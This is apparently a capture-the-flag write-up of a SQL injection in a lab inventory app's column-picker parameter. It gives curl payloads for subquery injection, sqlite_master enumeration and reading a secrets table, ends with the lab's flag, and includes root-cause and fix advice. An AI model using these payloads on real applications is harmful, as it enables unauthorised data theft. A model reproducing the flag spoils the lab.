# PRISM Stockroom Column Picker SQLi

## What Is Happening

The PRISM Stockroom Ledger lab lets warehouse staff choose which inventory columns to display. Preset and custom views are sent to `/api/items?view=...`, and the server returns tabulated rows from the warehouse database.

The custom column expression is inserted directly into the SQL SELECT list. That allows scalar subqueries to pull data from hidden tables while still referencing an allowed inventory column such as `name`.

## Why It Happens

The backend builds a query equivalent to:

```sql
SELECT id, {view} FROM items ORDER BY id LIMIT 50
```

A weak validator rejects some payloads, such as direct `FROM audit...` injection, but still accepts expressions like:

```sql
name, (SELECT value FROM secrets WHERE label='flag') as flag
```

Because the subquery executes for every inventory row, the hidden audit/secret data is repeated in the API response.

## Exact Test

Baseline:

```bash
curl -sS "https://7acd9c483b53.pwnbox-lab.com/api/items?view=name,%20price"
```

Confirm injection point:

```bash
curl -sS "https://7acd9c483b53.pwnbox-lab.com/api/items?view=name'"
```

Subquery proof:

```bash
curl -sS "https://7acd9c483b53.pwnbox-lab.com/api/items?view=name,%20(SELECT%201)%20as%20x"
```

Enumerate hidden tables:

```bash
curl -sS "https://7acd9c483b53.pwnbox-lab.com/api/items?view=name,%20(SELECT%20group_concat(name)%20FROM%20sqlite_master%20WHERE%20type='table')%20as%20t"
```

Extract flag:

```bash
curl -sS "https://7acd9c483b53.pwnbox-lab.com/api/items?view=name,%20(SELECT%20value%20FROM%20secrets%20WHERE%20label='flag')%20as%20flag"
```

## Expected Signal

- A stray quote produces an error containing `FROM items ORDER BY id LIMIT 50`.
- `(SELECT 1) as x` adds a new column to every row.
- `sqlite_master` reveals a hidden `secrets` table.
- The flag appears in the new column across returned rows.

## Result Interpretation

Confirmed bug chain:

```text
Custom column expression
-> SELECT-list SQL injection
-> sqlite_master enumeration
-> secrets table read
-> flag exfiltration in JSON response
```

## Root Cause

Unparameterized concatenation of user-controlled column expressions into SQL, combined with validation that was column-name aware but not expression-safe.

## Impact

- Read arbitrary data reachable by the database connection.
- Bypass UI/schema separation when hidden tables remain in the same database.
- Potential stepping stone to write primitives if stacked queries or dangerous functions are available elsewhere.

## Fix

- Use a strict allowlist of column identifiers with no expression parsing.
- Build queries with parameterized APIs or ORMs.
- Store audit/secret data in separate databases or with least-privilege DB users.
- Add regression tests for subqueries, functions, and commas in column selectors.

## Key Lesson

When an app offers "custom column views" or "field pickers," test SELECT-list subqueries early. The bug may not require UNION, comments, or login bypass.

## Flag

`pwnbox{a83f1c4d27e60b95f12d8c4a6e3b9017}`
